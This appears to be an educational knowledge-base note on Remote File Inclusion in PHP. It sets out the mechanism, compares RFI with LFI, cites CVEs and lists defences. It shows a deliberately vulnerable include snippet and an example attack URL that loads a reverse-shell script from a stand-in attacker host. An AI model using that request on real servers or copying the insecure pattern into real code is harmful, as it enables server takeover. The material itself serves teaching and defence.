---
aliases:[RFI, remote-file-inclusion]
---
# Remote File Inclusion Vulnerability
A type of web vulnerability that allows an attacker to force an application to include code files imported from another location (like a server controlled by an attacker).

## Mechanism:
Many coding languages used to develop web applications on the server side allow developers to include source code from other files. Some languages allow inclusion *via URL* while others allow the use of local files.

This inclusion is usually *static* which means the URL is defined in the source code and *cannot be modified*. If the developer wants a file to be included dynamically from a remote location, then it may be passed as a user input parameter.

In an #RFI vulnerability, an attacker will modify the user input to include their own malicious remote files. Most commonly happens in *PHP using the include expression* (most other languages used for web applications make it more complex to include remote files in the code).
- This ability has been deprecated in PHP since v 7.4.0

### VS. [Local File Inclusion](cybersecurity/vulnerabilites/LFI.md):
When an attacker uses the application's code to access another file *included in the same server* this is known as an #LFI vulnerability. 

LFI's are more common because:
- It includes all cases in which an attacker can access a local file where they shouldn't (not just when the developer includes a source code file)
- It is easier to do in most languages (not just PHP)
- Developers need their code to read local files more often then remote ones
- LFI also often goes hand in hand with #directory-traversal, but RFI by definition cannot lead to directory traversal because the file *is included via URL, not filepath*.

## Example of PHP RFI:
A developer wants to include a file from another server but the file is not static. This snippet is from `index.php`:
```PHP
<?PHP 
  $module = $_GET["module"];
  include $module;
?>
```

The server runs PHP v7.3.33 and the `php.ini` file includes the following parameter:
`allow_url_include = On`

This parameter (deprecated with PHP 7.4.0) allows the `include` expression to parse a URL and include a file from it. The file is taken from the `GET HTTP` request so the following module can be included:
`https://target.com/index.php?module=http://server2.target.com/welcome.php`

### Attack vector:
An attacker can manipulate the `GET` request sent to `index.php` to include a URL with a #reverse-shell script which will connect to a malicious server:
```
http://target.com/index.php?module=http://attacker.example2.com/php-reverse-shell.php
```
The applications runs the code of the reverse shell, causing [Reverse Code Execution](/cybersecurity/attacks/RCE.md) and granting the attacker access to the server's command line.

### Examples of known RFI vulnerabilities:
These are common #open-source web apps with known vulnerabilities to RFI:
1. #CVE-2018-16283: [Wechat Broadcast Plugin 1.2.0](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16283) (WordPress plugin)
2. #CVE-2014-7228: [Joomla core](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7228) multiple RFI vulnerabilities in several versions

## Defense:
### Detection:
Look for versions of software that are known to be vulnerable to RFI. Versioning can be detected via the software's documentation, network scanners, or with tools like [software composition analysis](https://www.invicti.com/learn/software-composition-analysis-sca/) software ( #SCA).
- SCA software is non-invasive, meaning they don't need to perform mock attacks to analyze an application. Instead, they try to interact with the application while it runs in order to "fingerprint" a component or search through the apps code.

The only way to know for certain that an unknown RFI vulnerability exists in an application *is to exploit it*.
- Perform pen-testing on it
- Use a security testing tool which will automate the exploit

### Prevention:
*Avoid using user input in include expressions*: this includes URLs coming from a user to be used in #HTTP-requests, but also any other data whose source can be manipulated by users/ attackers.

If your application requires using includes, then *create a whitelist of safe files*

*Do not rely on blacklisting:* or other methods of input sanitization and validation. Attackers can bypass these types of defenses easily.

Don't use versions of PHP older than 7.4.0, and avoid using other software which is known to have vulnerabilities to RFI.

> [!Links]
> [Invicti: Remote file inclusion](https://www.invicti.com/learn/remote-file-inclusion-rfi/)

